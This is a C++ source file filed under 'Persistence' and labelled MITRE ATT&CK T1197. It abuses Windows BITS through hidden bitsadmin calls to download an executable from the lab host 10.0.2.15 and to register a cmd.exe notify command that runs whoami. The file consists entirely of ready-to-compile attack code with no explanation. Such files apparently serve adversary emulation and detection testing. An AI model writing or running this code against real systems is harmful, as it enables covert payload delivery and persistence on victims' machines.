---
title: "T1197.BITS Jobs.BITS Jobs"
folder: "05. Persistence"
---


#include <windows.h>
#include <fstream>
#include <iostream>

void BITSBackground() {
    
    const char* command1 = "bitsadmin /create Testik";
    const char* command2 = "bitsadmin /addfile Testik http://10.0.2.15:80/KimJestem.exe  C:\\Users\\User\\Desktop\\KimJestem.exe";
    const char* command3 = "bitsadmin /setnotifycmdline Testik C:\\Windows\\System32\\cmd.exe \" /c whoami > C:\\Users\\User\\Desktop\\KimJestem.txt\"";
    const char* command4 = "bitsadmin /resume Testik";
    const char* command6 = "bitsadmin /complete Testik";
    STARTUPINFOA si = {};
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi;
    

    if (CreateProcessA(NULL, const_cast<LPSTR>(command1), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
    if (CreateProcessA(NULL, const_cast<LPSTR>(command2), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
    if (CreateProcessA(NULL, const_cast<LPSTR>(command3), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
    if (CreateProcessA(NULL, const_cast<LPSTR>(command4), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    } 
    Sleep(15000);
    if (CreateProcessA(NULL, const_cast<LPSTR>(command6), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }


}



int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    BITSBackground();

    return 0;
}